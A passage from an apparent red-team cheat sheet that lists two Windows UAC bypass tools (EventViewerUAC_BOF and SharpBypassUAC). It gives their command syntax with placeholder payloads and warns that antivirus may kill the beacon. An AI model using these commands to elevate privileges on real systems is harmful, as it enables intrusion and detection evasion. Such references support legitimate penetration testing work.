...
>Most methods will still work but may trigger AV and kill the current beacon \(this will not always stop a new high intergrity beacon from starting\)\. 
- Event Viewer deserialization UAC bypass \([EventViewerUAC_BOF](https://github.com/Octoberfest7/EventViewerUAC_BOF)\): `EVUAC "C:\<path to payload.exe>"`
- Multiple UAC bypass techniques \([SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC)\): `.\SharpBypassUAC.exe -b <fodhelper | computerdefaults | sdclt | slui> -e <base64 encoded command>`
